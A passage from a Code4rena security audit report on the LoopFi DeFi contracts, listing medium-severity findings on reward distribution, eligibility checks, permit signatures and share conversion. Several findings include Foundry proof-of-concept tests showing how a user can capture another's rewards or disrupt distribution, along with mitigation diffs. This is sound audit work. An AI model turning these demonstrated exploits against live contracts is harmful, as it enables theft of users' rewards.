    endingTimeCadence = 30 seconds;
    incentivesController.setRewardsPerSecond(rewardsPerSecond, true);
    incentivesController.setEndingTimeUpdateCadence(endingTimeCadence);

    address Alice = address(0x123);
    address Bob = address(0x567);

    address vault1 = address(0x1);
    uint256 totalAllocPoint = 1000;
    incentivesController.addPool(vault1, totalAllocPoint / 2); //give both pools equal allocation for convenience

    address vault2 = address(0x2);
    incentivesController.addPool(vault2, totalAllocPoint / 2); //give both pools equal allocation for convenience

    loopToken.mint(address(incentivesController), 120 ether);
    incentivesController.registerRewardDeposit(120 ether);    //give out 120 ether as incentive

    vm.mockCall(
        mockEligibilityDataProvider,
        abi.encodeWithSelector(IEligibilityDataProvider.lastEligibleStatus.selector, Alice),
        abi.encode(true)
    );
    vm.mockCall(
        mockEligibilityDataProvider,
        abi.encodeWithSelector(EligibilityDataProvider.refresh.selector, Alice),
        abi.encode(true)
    );
    vm.prank(vault1);                                                //set msg.sender to vault1
    incentivesController.handleActionAfter(Alice, 1 ether, 1 ether); //simulates Alice taking on a debt of 1 ether at vault1

    vm.mockCall(
        mockEligibilityDataProvider,
        abi.encodeWithSelector(IEligibilityDataProvider.lastEligibleStatus.selector, Bob),
        abi.encode(true)
    );
    vm.mockCall(
        mockEligibilityDataProvider,
        abi.encodeWithSelector(EligibilityDataProvider.refresh.selector, Bob),
        abi.encode(true)
    );
    vm.prank(vault2);                                              //set msg.sender to vault2
    incentivesController.handleActionAfter(Bob, 1 ether, 1 ether); //simulates Bob taking on a debt of 1 ether at vault2

    // based on the above scenario, each Alice and Bob are supposed to get 60 ether each at the end.

    skip(1 minutes); // go to the 1 minute mark (day x in the symbol diagram)
    vm.mockCall(
        mockEligibilityDataProvider,
        abi.encodeWithSelector(IEligibilityDataProvider.lastEligibleStatus.selector, Alice),
        abi.encode(true)
    );
    vm.mockCall(
        mockEligibilityDataProvider,
        abi.encodeWithSelector(EligibilityDataProvider.refresh.selector, Alice),
        abi.encode(true)
    );
    vm.prank(vault1);                                                                //set msg.sender to vault1
    incentivesController.handleActionAfter(Alice, 1 ether - 1 wei, 1 ether - 1 wei); //simulates Alice changing debt by any insignificant amount in vault1, resulting in _updatePool being called for vault1

    skip(1 minutes); //further skip 1 minute, reaching the **2 minute mark** (day y in the symbol diagram)
    console.log("Alice rewards at 2 minutes:", incentivesController.allPendingRewards(Alice)); // 2 minutes is the time at which 60 ether should be given to each of Alice and Bob, and no one is supposed to get more afterwards if not for the bug
    skip(1 minutes); // (day z in the symbol diagram)
    console.log("Alice rewards at 3 minutes:", incentivesController.allPendingRewards(Alice)); // as you can see Alice continues to receive rewards even after she isnt supposed to, exploiting the difference in pool.lastRewardTime to do so

    console.log("Bob's reward at the end:   ", incentivesController.allPendingRewards(Bob));
}
```

</details>

**Console Output:**

```
Ran 1 test for src/test/unit/ChefIncentivesController.t.sol:ChefIncentivesControllerTest
[PASS] test_durationHack() (gas: 688851)
Logs:
  Alice rewards at 2 minutes: 59999999999999999970
  Alice rewards at 3 minutes: 74999999999999999955
  Bob's reward at the end:    45000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.68ms (1.13ms CPU time)

Ran 1 test suite in 301.12ms (5.68ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Notable comments:**

- The first `handleActionAfter` is where we simulate Alice taking on 1 ether debt inside vault1.
- The second `handleActionAfter` is where we simulate Bob taking on 1 ether debt inside vault2.
- The last `handleActionAfter` is where we simulate Alice changing her debt by an insignificant amount in vault1, resulting in `_updatePool` being called for **only** vault1.
- Since we mint `120 ether` as rewards and we set `rewardsPerSecond = 1 ether`, and both Alice and Bob start staking the **same amounts** at the **same time** in different pools of **equal** point allocation weightage, at the end of `2 minutes`, both Alice and Bob should have received **equal** amounts of reward (`60 ether` **each**).
- However, we can see in the console output that Alice continues to gain tokens past `2 minutes` and at the end has `74999999999999999955 tokens` \~= `75 ether`, while Bob only has `45 ether`.
- Alice has successfully taken advantage of the difference in pool's `lastRewardTime` bug, to steal `15 ether` of rewards from Bob, resulting in a **permanent** loss of rewards for Bob. (the `15 ether` here is basically the `1/4` of part `C` in the symbol diagram explanation).

### Recommended Mitigation Steps

```diff
struct VaultInfo {
    uint256 totalSupply;
    uint256 allocPoint; // How many allocation points assigned to this vault.
    uint256 lastRewardTime; // Last second that reward distribution occurs.
    uint256 accRewardPerShare; // Accumulated rewards per share, times ACC_REWARD_PRECISION. See below.
+   uint256 accountedRewards;
}
```

```diff
function _updatePool(VaultInfo storage pool, uint256 _totalAllocPoint) internal {
    uint256 timestamp = block.timestamp;
    uint256 endReward = endRewardTime();
    if (endReward <= timestamp) {
        timestamp = endReward;
    }
    if (timestamp <= pool.lastRewardTime) {
        return;
    }

    (uint256 reward, uint256 newAccRewardPerShare) = _newRewards(pool, _totalAllocPoint);
    accountedRewards = accountedRewards + reward;
+   pool.accountedRewards = pool.accountedRewards + reward;
    pool.accRewardPerShare = pool.accRewardPerShare + newAccRewardPerShare;
    pool.lastRewardTime = timestamp;
}
```

```diff
function _newRewards(
    VaultInfo memory pool,
    uint256 _totalAllocPoint
) internal view returns (uint256 newReward, uint256 newAccRewardPerShare) {
    uint256 lpSupply = pool.totalSupply;
    if (lpSupply > 0) {
        uint256 duration = block.timestamp - pool.lastRewardTime;
        uint256 rawReward = duration * rewardsPerSecond;

-       uint256 rewards = availableRewards();
+       uint256 rewards = (depositedRewards * pool.allocPoint / _totalAllocPoint) - pool.accountedRewards;
        if (rewards < rawReward) {
            rawReward = rewards;
        }
-       newReward = (rawReward * pool.allocPoint) / _totalAllocPoint;
+       newReward = rawReward;
        newAccRewardPerShare = (newReward * ACC_REWARD_PRECISION) / lpSupply;
    }
}
```

**After those changes, console output is now showing that rewards are distributed accurately (`60 ether` each)**:

```
Ran 1 test for src/test/unit/ChefIncentivesController.t.sol:ChefIncentivesControllerTest
[PASS] test_durationHack() (gas: 713083)
Logs:
  Alice rewards at 2 minutes: 60000000000000000000
  Alice rewards at 3 minutes: 60000000000000000000
  Bob's reward at the end:    60000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 34.47ms (4.83ms CPU time)

Ran 1 test suite in 348.00ms (34.47ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Tools Used

Foundry, VSCode

### Assessed type

Math

**[amarcu (LoopFi) confirmed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/158#issuecomment-2363368006):**
 > This is a grieve attack on rewards and not user funds. Maybe it should be a medium.

**[Koolex (judge) decreased severity to Medium](https://github.com/code-423n4/2024-07-loopfi-findings/issues/158#issuecomment-2371262383)**

***

## [[M-23] The debt in `EligibilityDataProvider::requiredUsdValue()` needs to be converted into USD; otherwise, it is not a correct value comparison](https://github.com/code-423n4/2024-07-loopfi-findings/issues/156)
*Submitted by [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/156), also found by [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/50) and [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/47)*

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L187>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L197>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L274>

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/EligibilityDataProvider.sol#L177>

### Impact

It does not align with the documentation and the eligibility criteria for rewards are lower than what is specified by the protocol.

### Proof of Concept

```javascript
   function requiredUsdValue(address user) public view returns (uint256 required) {
@>>        uint256 totalNormalDebt = vaultRegistry.getUserTotalDebt(user);
@>>        required = (totalNormalDebt * requiredDepositRatio) / RATIO_DIVISOR;
        return _lockedUsdValue(required);
    }
```

Here, the value of `totalNormalDebt` should be calculated first, and then the `requiredDepositRatio` should be applied to that value.

However, in the current implementation:

```javascript
function isEligibleForRewards(address _user) public view returns (bool) {
        uint256 lockedValue = lockedUsdValue(_user);

        uint256 requiredValue = (requiredUsdValue(_user) * priceToleranceRatio) / RATIO_DIVISOR;
        return requiredValue != 0 && lockedValue >= requiredValue;
    }
```

```javascript
function lockedUsdValue(address user) public view returns (uint256) {
        Balances memory _balances = IMultiFeeDistribution(multiFeeDistribution).getBalances(user);
        return _lockedUsdValue(_balances.locked);
    }
```

```javascript
function _lockedUsdValue(uint256 lockedLP) internal view returns (uint256) {
        uint256 lpPrice = priceProvider.getLpTokenPriceUsd();
        return (lockedLP * lpPrice) / 10 ** 18;
    }
```

Based on the `lockedUsdValue` function and the `_lockedUsdValue()` function, we know that:

```solidity
lockedValue = _lockedUsdValue(_balances.locked) = (_balances.locked * lpPrice) / 10**18;

uint256 requiredValue = (requiredUsdValue(_user) * priceToleranceRatio) / RATIO_DIVISOR;
```

This expands to:

```solidity
requiredValue = _lockedUsdValue((totalNormalDebt * requiredDepositRatio) / RATIO_DIVISOR) * priceToleranceRatio / RATIO_DIVISOR;
```

Which further breaks down to:

```solidity
requiredValue = (((totalNormalDebt * requiredDepositRatio) / RATIO_DIVISOR) * lpPrice / 10**18) * (priceToleranceRatio / RATIO_DIVISOR);
```

This shows the step-by-step calculation of the `lockedValue` and `requiredValue` based on the total debt, deposit ratio, and price tolerances.

Thus, the comparison `lockedValue >= requiredValue` becomes:

```solidity
lockedLP > totalNormalDebt * (requiredDepositRatio / RATIO_DIVISOR) * (priceToleranceRatio / RATIO_DIVISOR)
```

Where:

- `requiredDepositRatio / RATIO_DIVISOR` = 5%
- `priceToleranceRatio / RATIO_DIVISOR` = 90%

This simplifies to:

```javascript
lockedLP > totalNormalDebt * 5% * 90% = 4.5% * totalNormalDebt
```

So, the condition checks if the `lockedLP` is greater than 4.5% of the `totalNormalDebt`.

This contradicts the description in the documentation:

> “Loopers maintaining a dLP value exceeding 5% of their Total Position Size qualify for LOOP token emissions to offset borrowing costs incurred from leveraging.”

In reality, because the value of one `lockedLP` token is lower than the value of the debt (in ETH), the number of `lockedLP` tokens falls far short of the actual requirement.

### Recommended Mitigation Steps

In the `requiredUsdValue` function, the debt value is first calculated and then multiplied by the relevant ratio. In fact, Radiant Capital implements this exact approach in their code, as shown [here](https://github.com/radiant-capital/v2/blob/cd618877151896415705468f1b2a43c4b75b3c5b/contracts/radiant/eligibility/EligibilityDataProvider.sol#L186).

### Assessed type

Error

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/156#event-14337730252)**

***

## [[M-24] `lastRPS` could be set to `0` accidentally](https://github.com/code-423n4/2024-07-loopfi-findings/issues/154)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/154), also found by [zzebra83](https://github.com/code-423n4/2024-07-loopfi-findings/issues/514) and [rscodes](https://github.com/code-423n4/2024-07-loopfi-findings/issues/261)*

New reward distribution can not start automatically when `lastRPS` is set to `0` accidentally.

### Proof of Concept

When [`ChefIncentivesController#claim()`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/ChefIncentivesController.sol#L518-L550) is called to vest reward for eligible user, `_updateEmissions()` is invoked first. This function checks if the current reward distribution has ended and, if so, stores the value of `rewardsPerSecond` into `lastRPS` for future use:

```solidity
    function _updateEmissions() internal {
        if (block.timestamp > endRewardTime()) {
            _massUpdatePools();
@>          lastRPS = rewardsPerSecond;
@>          rewardsPerSecond = 0;
            return;
        }
        setScheduledRewardsPerSecond();
    }
```

When new rewards are deposited, the cached value in `lastRPS` should be restored to `rewardsPerSecond` to restart the reward distribution.

```solidity
    function registerRewardDeposit(uint256 _amount) external onlyOwner {
        depositedRewards = depositedRewards + _amount;
        _massUpdatePools();
        if (rewardsPerSecond == 0 && lastRPS > 0) {
@>          rewardsPerSecond = lastRPS;
        }
        emit RewardDeposit(_amount);
    }
```

However, if somehow `claim()` is called twice continually when the current reward distribution ends, `lastRPS` will be set to `0` and `registerRewardDeposit()` can not restart new reward distribution.

Copy below codes to [ChefIncentivesController.t.sol](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/test/unit/ChefIncentivesController.t.sol) and run `forge test --match-test test_setLastRPStoZero`:

<details>

```solidity
    function test_setLastRPStoZero() public {
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        _excludeContracts(alice);
        _excludeContracts(bob);
        uint rps = incentivesController.rewardsPerSecond();
        incentivesController.addPool(address(0x1), 1000);
        incentivesController.addPool(address(0x2), 1000);
        incentivesController.setRewardsPerSecond(rps, true);
        loopToken.mint(address(incentivesController), 1000 ether);
        uint256 rewardAmount = 1000 ether;
        incentivesController.registerRewardDeposit(rewardAmount);

        incentivesController.start();

        vm.warp(block.timestamp + 30 days);

        address[] memory vaults = new address[](2);
        vaults[0] = address(0x1);
        vaults[1] = address(0x2);

        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(EligibilityDataProvider.isEligibleForRewards.selector, alice),
            abi.encode(true)
        );

        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(EligibilityDataProvider.refresh.selector, alice),
            abi.encode(true)
        );

        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(EligibilityDataProvider.getDqTime.selector, alice),
            abi.encode(0)
        );

        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(EligibilityDataProvider.isEligibleForRewards.selector, bob),
            abi.encode(true)
        );

        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(EligibilityDataProvider.refresh.selector, bob),
            abi.encode(true)
        );

        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(EligibilityDataProvider.getDqTime.selector, bob),
            abi.encode(0)
        );


        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(IEligibilityDataProvider.lastEligibleStatus.selector, alice),
            abi.encode(true)
        );
        vm.mockCall(
            mockEligibilityDataProvider,
            abi.encodeWithSelector(IEligibilityDataProvider.lastEligibleStatus.selector, bob),
            abi.encode(true)
        );
        vm.prank(address(0x1));
        incentivesController.handleActionAfter(alice, 500 ether, 1000 ether);
        vm.prank(address(0x2));
        incentivesController.handleActionAfter(bob, 500 ether, 1000 ether);

        vm.warp(block.timestamp + 30 days);

        vm.mockCall(
            mockMultiFeeDistribution,
            abi.encodeWithSelector(IMultiFeeDistribution.vestTokens.selector, alice, 1000 ether),
            abi.encode(true)
        );
        vm.mockCall(
            mockMultiFeeDistribution,
            abi.encodeWithSelector(IMultiFeeDistribution.vestTokens.selector, bob, 1000 ether),
            abi.encode(true)
        );
        //@audit-info rewardsPerSecond is 1e16 before claim for alice 
        assertEq(incentivesController.lastRPS(), 0);
        assertEq(incentivesController.rewardsPerSecond(), 10000000000000000);
        incentivesController.claim(alice, vaults);
        //@audit-info rewardsPerSecond is set to 0, and its previous value is stored in lastRPS for future use
        assertEq(incentivesController.lastRPS(), 10000000000000000);
        assertEq(incentivesController.rewardsPerSecond(), 0);
        incentivesController.claim(bob, vaults);
        //@audit-info however, lastRPS is updated to 0 when claim() is called again for bob.
        assertEq(incentivesController.lastRPS(), 0);
        assertEq(incentivesController.rewardsPerSecond(), 0);
        //@audit-info new reward deposit can not restart distribution
        loopToken.mint(address(incentivesController), 1000 ether);
        incentivesController.registerRewardDeposit(1000 ether);
        assertEq(incentivesController.rewardsPerSecond(), 0);
    }
```

</details>

### Recommended Mitigation Steps

`lastRPS` should not be updated when `rewardsPerSecond` is `0`:

```diff
    function _updateEmissions() internal {
        if (block.timestamp > endRewardTime()) {
            _massUpdatePools();
-           lastRPS = rewardsPerSecond;
+           if (rewardsPerSecond != 0) {
+               lastRPS = rewardsPerSecond;
+           }
            rewardsPerSecond = 0;
            return;
        }
        setScheduledRewardsPerSecond();
    }
```

### Assessed type

Invalid Validation

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/154#event-14337732341)**

**[0xAlix2 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/154#issuecomment-2393808618):**
 > @Koolex - The report shows a valid scenario where `lastRPS` could end up being 0; however, this is intended, if the `rewardsPerSecond` is set to 0 then so does `lastRPS`, as it represents `last RPS, used during refill after reserve empty`.
 > 
> Moreover, the report claims that new rewards can't be registered by calling `registerRewardDeposit`, because of the 0 value of `lastRPS`. However, the owner could simply call `setRewardsPerSecond` to reset it, and everything will continue to work as expected. Hence, this is invalid.

**[zzebra83 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/154#issuecomment-2394014924):**
> I agree with some of your points, and I think your conclusion is based off how this report is written and also the mitigation it suggests. 
> 
> When the admin calls `setRewardsPerSecond`, their intention could be to **persist** an RPS  value for all epochs going forward. This RPS value will then be used when calculating rewards claimable by users. However, by calling the claim function more than once as mentioned in this report, both RPS and last RPS reset to 0; hence, reward distribution is effectively DOS'd.
> 
> The only way this can then be fixed is if the admin is made aware of  the issue and then sets RPS value again by calling `setRewardsPerSecond` like you mentioned. But the issue is not fixed and will keep on happening and reward distribution to users will keep on getting disrupted and so on. Medium severity is appropriate, in my opinion.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/154#issuecomment-2440003146):**
 > Thank you for the input. Stays as-is.

***

## [[M-25] Incorrect address is used as `spender` for ERC20 permit signature verification](https://github.com/code-423n4/2024-07-loopfi-findings/issues/152)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/152), also found by [Rhaydden](https://github.com/code-423n4/2024-07-loopfi-findings/issues/498), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/112), and [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/72)*

The failure of permit signature verification might revert the whole function.
`PositionAction#increaseLever()` might revert if ERC20 permit signature is used as `permitParams`

### Proof of Concept

The [`IERC20Permit(token).safePermit()`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/TransferAction.sol#L67-L75) call is supposed to allow `spender` to spend up to `approvalAmount` of token on behalf of `from`. The `spender` in `_transferFrom()` should be the contract itself:

```solidity
            IERC20Permit(token).safePermit(
                from,
                to,
                params.approvalAmount,
                params.deadline,
                params.v,
                params.r,
                params.s
            );
@>          IERC20(token).safeTransferFrom(from, to, amount);
```

However, `IERC20Permit(token).safePermit()` use `to` as `spender` to verify the permit signature.  The `safePermit()` call will be reverted if `to` is not same as the contract itself.

Copy below codes to [PositionAction20.t.sol](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/test/integration/PositionAction20.lever.t.sol) and run `forge test --match-test test_increaseLeverWithInvalidPermission`:

```solidity
    function test_increaseLeverWithInvalidPermission() public {
        uint256 upFrontUnderliers = 20_000 ether;
        uint256 borrowAmount = 70_000 ether;
        uint256 amountOutMin = 69_000 ether;

        deal(address(USDC), user, upFrontUnderliers);

        // build increase lever params
        address[] memory assets = new address[](2);
        assets[0] = address(underlyingToken);
        assets[1] = address(USDC);

        LeverParams memory leverParams = LeverParams({
            position: address(userProxy),
            vault: address(vault),
            collateralToken: address(USDC),
            primarySwap: SwapParams({
                swapProtocol: SwapProtocol.UNIV3,
                swapType: SwapType.EXACT_IN,
                assetIn: address(underlyingToken),
                amount: borrowAmount,
                limit: amountOutMin,
                recipient: address(positionAction),
                deadline: block.timestamp + 100,
                args: abi.encode(weightedPoolIdArray, assets)
            }),
            auxSwap: emptySwap,
            auxAction: emptyPoolActionParams
        });

        PermitParams memory permitParams;

        uint256 deadline = block.timestamp + 100;
        //@audit-info the spender is userProxy
        (uint8 v, bytes32 r, bytes32 s) = PermitMaker.getPermitTransferFromSignature(
            address(USDC),
            address(userProxy),
            20_000 ether,
            0,
            deadline,
            0x12341234
        );
        permitParams = PermitParams({
            approvalType: ApprovalType.PERMIT,
            approvalAmount: 20_000 ether,
            nonce: 0,
            deadline: deadline,
            v: v,
            r: r,
            s: s
        });

        // call increaseLever
        vm.startPrank(user);
        //@audit-info revert due to invalid signature because `to` is used as `spender` to verify the signature, 
        //@audit-info while `to` inside the function `increaseLever()` is address(positionAction) instead of `userProxy`
        vm.expectRevert("EIP2612: invalid signature");
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.increaseLever.selector,
                leverParams,
                address(USDC),
                20_000 ether,
                address(user),
                permitParams
            )
        );
        vm.stopPrank();
    }
```

### Recommended Mitigation Steps

Use `address(this)` as `spender` for `safePermit()`:

```diff
            IERC20Permit(token).safePermit(
                from,
-               to,
+               address(this),
                params.approvalAmount,
                params.deadline,
                params.v,
                params.r,
                params.s
            );
            IERC20(token).safeTransferFrom(from, to, amount);
```

### Assessed type

Context

**[amarcu (Loopfi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/152#event-14320331765)**

**[Infect3d (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/152#issuecomment-2389513273):**
 > I believe the issue is invalid. Every instance of the code where `TransferAction::_transferFrom` is called uses `to == address(this)` (or `self` which is `address(this)`):
> - [PositionAction.sol#L323-L323](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol#L323-L323)
> - [PositionAction.sol#L520-L520](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol#L520-L520)
> - [PositionAction.sol#L579-L579](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PositionAction.sol#L579-L579)
> - [SwapAction.sol#L100-L100](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/SwapAction.sol#L100-L100)
> - [PoolAction.sol#L93-L93](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PoolAction.sol#L93-L93)
> - [PoolAction.sol#L104-L104](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/PoolAction.sol#L104-L104)

**[pkqs90 (warden) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/152#issuecomment-2419627819):**
 > As stated in the report, the `PositionAction#increaseLever()` will have an issue. Because `self` is not `address(this)` when triggered by `delegatecall` through a PRBProxy. `self` is the PositionAction.sol, while `address(this)` is the proxy's address.

**[Koolex (judge) commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/152#issuecomment-2441974222):**
 > No further change on this.

***

## [[M-26] `PoolV3#repayCreditAccount()` use incorrect share converting function to calculate profit and loss](https://github.com/code-423n4/2024-07-loopfi-findings/issues/150)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/150), also found by Afriauditor ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/565), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/295)), [Agontuk](https://github.com/code-423n4/2024-07-loopfi-findings/issues/463), [VAD37](https://github.com/code-423n4/2024-07-loopfi-findings/issues/385), [monrel](https://github.com/code-423n4/2024-07-loopfi-findings/issues/275), and [Trooper](https://github.com/code-423n4/2024-07-loopfi-findings/issues/244)*

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L549> 

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L553>

### Impact

Either the profit or the loss is calculated incorrectly, resulting in the treasury owns incorrect profit balance.

### Proof of Concept

Anyone can deposit `WETH` for `lpETH` by calling `PoolV3#deposit()` or `PoolV3#mint()`.  The exchange rate of `WETH:lpETH` is `1:1`.
The eligible credit manager can borrow `WETH` by calling `PoolV3#lendCreditAccount()`, and repay the debt and profit lately by calling `PoolV3#repayCreditAccount()`.
The corresponding amount of `lpETH` will be minted to `treasury` if there is profit, and the corresponding amount of `lpETH` should be burned from `treasury` if there is any loss:

```solidity
        if (profit > 0) {
@>          _mint(treasury, convertToShares(profit)); // U:[LP-14B]
        } else if (loss > 0) {
            address treasury_ = treasury;
            uint256 sharesInTreasury = balanceOf(treasury_);
@>          uint256 sharesToBurn = convertToShares(loss);
            if (sharesToBurn > sharesInTreasury) {
                unchecked {
                    emit IncurUncoveredLoss({
                        creditManager: msg.sender,
                        loss: convertToAssets(sharesToBurn - sharesInTreasury)
                    }); // U:[LP-14D]
                }
                sharesToBurn = sharesInTreasury;
            }
            _burn(treasury_, sharesToBurn); // U:[LP-14C,14D]
        }
```

However, `convertToShares()` is used to calculate shares for profit and loss, while  `_convertToShares()` is used to calculate shares in [`PoolV3#deposit()`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L243).
`convertToShares()` uses the exchange rate of `E4626` to calculate shares instead of `1:1` exchange rate defined in `PoolV3`.

The incorrect `convertToShares()` call could highly return less shares than expected, resulting in the treasury owning incorrect balance.

### Recommended Mitigation Steps

Use `_convertToShares()` for share calculation:

```diff
        if (profit > 0) {
-           _mint(treasury, convertToShares(profit)); // U:[LP-14B]
+           _mint(treasury, _convertToShares(profit)); 
        } else if (loss > 0) {
            address treasury_ = treasury;
            uint256 sharesInTreasury = balanceOf(treasury_);
-           uint256 sharesToBurn = convertToShares(loss);
+           uint256 sharesToBurn = _convertToShares(loss);
            if (sharesToBurn > sharesInTreasury) {
                unchecked {
                    emit IncurUncoveredLoss({
                        creditManager: msg.sender,
                        loss: convertToAssets(sharesToBurn - sharesInTreasury)
                    }); // U:[LP-14D]
                }
                sharesToBurn = sharesInTreasury;
            }
            _burn(treasury_, sharesToBurn); // U:[LP-14C,14D]
        }
```

### Assessed type

Math

**[0xtj24 (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/150#event-14198057510)**

***

## [[M-27] Rewards may be spread out among the wrong time period due to the way the protocol calculates it](https://github.com/code-423n4/2024-07-loopfi-findings/issues/133)
*Submitted by [rscodes](https://github.com/code-423n4/2024-07-loopfi-findings/issues/133)*

First, lets reference how the rewards are calculated when a 2nd incentive is introduced while another incentive is still within its `rewardsDuration` period.

In `MultiFeeDistribution.sol`'s `_notifyReward` function:

```solidity
// inside function _notifyReward(address rewardToken, uint256 reward):
if (block.timestamp >= r.periodFinish) {
    .....
} else {
->    uint256 remaining = r.periodFinish - block.timestamp;
->    uint256 leftover = (remaining * r.rewardPerSecond) / 1e12;
->    r.rewardPerSecond = ((reward + leftover) * 1e12) / rewardsDuration;
}
```

This will cause rewards from the initial incentive to be delayed and spread out across the 2nd incentive's period and initial stakers will have wrong amount of claimable rewards during the timestamps all the way until the 2nd incentive's `rewardsDuration` ends. Other than delays, the original staker could also possibly **permanently lose some of their deserved reward tokens**, as described further below in "2nd way of exploit" section.

### Proof of Code

The symbol diagram below demonstrates the scenario ran in the foundry test:

```
          [----A----|----B----]           (1st incentive)
                    [---------C---------] (2nd incentive)
    Day:  0        15         30       45  
```

- We will use `rewardsDuration = 30 days`.
- The first `[]` represents the 1st incentive, which was introduced on `day 0`, where `A` represents the first half of the rewards that should be given out during the first half of the first incentive's `rewardDuration` period. And `B` represents the second half respectively.
- The second `[]` represents the 2nd incentive, which was introduced on `day 15`, where `C` represents all the rewards from the 2nd incentive to be rewarded.

```solidity
01: function test_rewardsSpreadAcrossWrongPeriod() public {
02:     assert(rewardsDuration == 30 days); // we will use 30 days as the rewardsDuration for convenience 
03:     address Alice = address(0x123456);
04:     uint256 amount = 1 ether;
05:     uint256[] memory lockDurations = new uint256[](1);
06:     uint256[] memory rewardMultipliers = new uint256[](1);
07:     lockDurations[0] = 700 days;
08:     rewardMultipliers[0] = 1;
09:     multiFeeDistribution.setLockTypeInfo(lockDurations, rewardMultipliers);
10: 
11:     stakeToken.mint(address(this), amount);
12:     multiFeeDistribution.setLPToken(address(stakeToken));
13: 
14:     multiFeeDistribution.setAddresses(IChefIncentivesController(vm.addr(uint256(keccak256("incentivesController")))), vm.addr(uint256(keccak256("treasury"))));
15:     vm.mockCall(
16:         vm.addr(uint256(keccak256("incentivesController"))),
17:         abi.encodeWithSelector(IChefIncentivesController.afterLockUpdate.selector, Alice),
18:         abi.encode(true)
19:     );
20:     stakeToken.approve(address(multiFeeDistribution), amount);
21:     multiFeeDistribution.stake(amount, Alice, 0);    // Alice now has 1 ether staked (with lockTypeIndex=0)
22:     require(multiFeeDistribution.lockedBalance(Alice) == amount);
23: 
24:     address[] memory minters = new address[](1);
25:     minters[0] = address(this);
26:     multiFeeDistribution.setMinters(minters);
27: 
28:     amount = 10000 ether;
29:     loopToken.mint(address(this), amount);
30:     loopToken.transfer(address(multiFeeDistribution), amount);
31: 
32:     vm.mockCall(
33:         mockPriceProvider,
34:         abi.encodeWithSelector(IPriceProvider.getRewardTokenPrice.selector, address(loopToken), amount),
35:         abi.encode(8)
36:     );
37:     multiFeeDistribution.vestTokens(address(multiFeeDistribution), amount, false);//1st incentive introduced on day 0
38:     
39:     skip(15 days); //go to day 15
40:     address[] memory rewardTokens_ = new address[](1);
41:     rewardTokens_[0] = address(loopToken);
42:     vm.prank(Alice);
43:     multiFeeDistribution.getReward(rewardTokens_); //withdraw at day 15
44:     console.log("Alice's balance at day 15| ", loopToken.balanceOf(Alice));
45: 
46:     loopToken.mint(address(this), amount);
47:     loopToken.transfer(address(multiFeeDistribution), amount);
48:     multiFeeDistribution.vestTokens(address(multiFeeDistribution), amount, false);//2nd incentive introduced on day 15
49: 
50:     skip(15 days); //go to day 30
51:     vm.prank(Alice);
52:     multiFeeDistribution.getReward(rewardTokens_); //withdraw at day 30
53:     console.log("Alice's balance at day 30|", loopToken.balanceOf(Alice)); //reminder: Alice's current loopToken balance is inclusive of what she withdrew on day 15
54: }
```

**Console Output:**

```
Ran 1 test for src/test/unit/MultiFeeDistribution.t.sol:MultiFeeDistributionTest
[PASS] test_rewardsSpreadAcrossWrongPeriod() (gas: 813968)
Logs:
  Alice's balance at day 15|  4999999999999999999999
